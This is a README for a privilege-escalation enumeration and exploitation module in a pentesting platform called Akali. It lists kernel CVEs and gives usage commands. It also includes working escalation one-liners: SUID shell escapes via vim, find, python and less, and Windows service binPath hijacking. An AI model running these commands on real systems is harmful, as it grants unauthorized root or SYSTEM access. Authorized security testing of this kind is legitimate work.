# Privilege Escalation Module

Desktop privilege escalation enumeration and exploitation for Windows and Linux systems.

## Overview

The `privesc` module provides comprehensive privilege escalation enumeration and exploitation capabilities for both Windows and Linux operating systems. It identifies common misconfigurations, weak permissions, and known kernel exploits that can be used to escalate privileges.

## Features

### Windows Enumeration
- Unquoted service paths with spaces
- Weak service permissions (modifiable by low-privilege users)
- AlwaysInstallElevated registry settings
- DLL hijacking opportunities
- Scheduled tasks running with high privileges
- Registry autoruns
- Passwords in registry and files
- Token privilege enumeration (SeDebugPrivilege, SeImpersonatePrivilege, etc.)
- UAC bypass vectors
- Installed software enumeration

### Linux Enumeration
- SUID/SGID binaries (exploitable binaries marked)
- Sudo misconfigurations (NOPASSWD, exploitable commands)
- Cron jobs with high privileges
- Writable /etc files (passwd, shadow, sudoers)
- Docker/container escape vectors (privileged containers, docker.sock)
- Linux capabilities (cap_setuid, cap_sys_admin, etc.)
- NFS exports with no_root_squash
- PATH hijacking opportunities
- Password hunting (shell history, config files)

### Kernel Exploit Database
- 10+ Windows kernel exploits (CVE-2021-1732, CVE-2020-0787, HiveNightmare, etc.)
- 12+ Linux kernel exploits (Dirty COW, Dirty Pipe, PwnKit, Baron Samedit, etc.)
- Version matching and severity classification
- Exploit availability tracking
- Reference links to PoC code

## Installation

The module is part of Akali Phase 9B. No additional dependencies required beyond Python 3.8+.

```bash
# Module is already integrated into Akali
cd ~/akali
python3 -m pytest tests/extended/privesc/  # Run tests (82 passing)
```

## Usage

### CLI Commands

```bash
# Auto-enumerate (detects OS automatically)
akali privesc enum

# Enumerate specific OS
akali privesc enum --os windows
akali privesc enum --os linux

# Export results
akali privesc enum --output results.json
akali privesc enum --output results.html --format html

# Check for kernel exploits
akali privesc check-kernel --os windows --version "Windows 10 1909"
akali privesc check-kernel --os linux --version "Ubuntu 20.04"

# Exploit weak service permissions (Windows)
akali privesc exploit-service --name VulnerableService --payload C:\payload.exe

# Exploit SUID binary (Linux)
akali privesc exploit-suid --binary /usr/bin/vim --command "!/bin/bash"

# Check sudo misconfigurations (Linux)
akali privesc check-sudo
```

### Python API

```python
from extended.privesc import PrivilegeEscalation

# Initialize
privesc = PrivilegeEscalation()

# Auto-detect and enumerate
results = privesc.auto_enumerate()

# Windows enumeration
windows_results = privesc.enumerate_windows(local=True)

# Linux enumeration
linux_results = privesc.enumerate_linux(local=True)

# Check kernel exploits
exploits = privesc.check_kernel_exploits('linux', 'Ubuntu 20.04')

# Export results
privesc.export_results(results, 'report.json', format='json')
privesc.export_results(results, 'report.html', format='html')
```

## Enumeration Output Structure

### Windows
```python
{
    'os_type': 'windows',
    'services': [
        {
            'service_name': 'VulnerableService',
            'path': 'C:\\Program Files\\App\\service.exe',
            'severity': 'high',
            'description': 'Unquoted service path with spaces'
        }
    ],
    'scheduled_tasks': [...],
    'registry': [...],
    'dll_hijacking': [...],
    'always_install_elevated': {...},
    'token_privileges': [...],
    'uac_bypass': [...],
    'kernel_exploits': [...]
}
```

### Linux
```python
{
    'os_type': 'linux',
    'suid_binaries': [
        {
            'path': '/usr/bin/vim',
            'binary': 'vim',
            'exploitable': True,
            'severity': 'high',
            'description': 'SUID binary: /usr/bin/vim (exploitable)'
        }
    ],
    'sudo_config': [...],
    'cron_jobs': [...],
    'capabilities': [...],
    'docker_escape': [...],
    'writable_etc': [...],
    'kernel_exploits': [...]
}
```

## Severity Levels

| Severity | Description | Examples |
|----------|-------------|----------|
| **Critical** | Immediate privilege escalation | Writable /etc/shadow, Docker socket access, Kernel exploits |
| **High** | High probability of privilege escalation | SUID vim/find/python, Weak service permissions, Sudo NOPASSWD |
| **Medium** | Potential privilege escalation | Writable PATH directories, DLL hijacking, Registry autoruns |
| **Low** | Information gathering | SGID binaries, Cron jobs, Installed software |

## Kernel Exploit Database

Located at `extended/privesc/kernel_exploits.json`, contains 22+ exploits:

### Windows Exploits
- CVE-2021-1732: Win32k Elevation of Privilege
- CVE-2021-36934: HiveNightmare/SeriousSAM (critical)
- CVE-2020-0796: SMBGhost (critical)
- CVE-2020-0787: BITS Elevation of Privilege
- CVE-2019-1388: Certificate Dialog UAC Bypass

### Linux Exploits
- CVE-2022-0847: Dirty Pipe (critical)
- CVE-2021-4034: PwnKit - Polkit (critical)
- CVE-2021-3156: Baron Samedit - Sudo Heap Overflow (critical)
- CVE-2016-5195: Dirty COW (critical)
- CVE-2021-3493: OverlayFS Ubuntu Kernel Exploit

## Exploitation Methods

### SUID Binary Exploitation (Linux)

Common exploitable SUID binaries:

```bash
# vim
vim -c ':!/bin/bash'

# find
find / -exec /bin/bash \;

# python
python -c 'import os; os.setuid(0); os.system("/bin/bash")'

# systemctl
systemctl status
!bash

# less
less /etc/profile
!bash
```

### Service Exploitation (Windows)

Unquoted service path exploitation:

```powershell
# Service path: C:\Program Files\Vulnerable App\service.exe
# Write malicious executable to:
C:\Program.exe  (tried first)
C:\Program Files\Vulnerable.exe  (tried second)
```

Weak service permissions:

```powershell
# Modify service binary path
sc config VulnerableService binPath= "C:\payload.exe"
sc stop VulnerableService
sc start VulnerableService
```

## Testing

The module includes 82 comprehensive tests:

```bash
# Run all tests
python3 -m pytest tests/extended/privesc/ -v

# Run specific test file
python3 -m pytest tests/extended/privesc/test_privesc_engine.py -v
python3 -m pytest tests/extended/privesc/test_windows_enum.py -v
python3 -m pytest tests/extended/privesc/test_linux_enum.py -v
python3 -m pytest tests/extended/privesc/test_kernel_exploits.py -v
```

## Architecture

```
extended/privesc/
├── __init__.py                 # Module exports
├── privesc_engine.py           # Main PrivilegeEscalation class
├── windows_enum.py             # Windows enumeration
├── linux_enum.py               # Linux enumeration
├── exploit_service.py          # Service exploitation (Windows)
├── kernel_exploits.py          # Kernel exploit database
├── kernel_exploits.json        # JSON database (22+ exploits)
└── README.md                   # This file

tests/extended/privesc/
├── test_privesc_engine.py      # Engine tests (19 tests)
├── test_windows_enum.py        # Windows tests (15 tests)
├── test_linux_enum.py          # Linux tests (17 tests)
├── test_kernel_exploits.py     # Kernel DB tests (17 tests)
└── test_exploit_service.py     # Service exploit tests (14 tests)
```

## Security Warnings

This module is designed for **authorized penetration testing and security assessments only**.

- Always obtain written permission before testing
- Never use on production systems without approval
- Some enumeration commands may trigger security alerts
- Exploitation methods are for educational purposes
- Follow responsible disclosure practices

## Integration with Akali

The privesc module integrates seamlessly with Akali's existing infrastructure:

```python
# In core/cli.py
from extended.privesc.privesc_engine import PrivilegeEscalation

class AkaliCLI:
    def __init__(self):
        # ...
        self.privesc = PrivilegeEscalation()

    def privesc_enumerate(self, os_type=None, output=None):
        # CLI method for enumeration
        pass
```

## Future Enhancements

- Remote enumeration support (WinRM, SSH)
- macOS privilege escalation vectors
- Automated exploitation chains
- Integration with Metasploit/Empire payloads
- Real-time privilege escalation monitoring
- Custom kernel exploit database updates

## References

- [GTFOBins](https://gtfobins.github.io/) - SUID binary exploitation
- [LOLBAS](https://lolbas-project.github.io/) - Windows Living Off The Land binaries
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) - Privilege escalation techniques
- [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation) - Linux/Windows privesc
- [Windows Privilege Escalation Fundamentals](https://www.fuzzysecurity.com/tutorials/16.html)

## License

Part of Akali security platform. For authorized security testing only.

## Contributors

Built by Akali Phase 9B development team.

---

**Akali** - The Security Sentinel
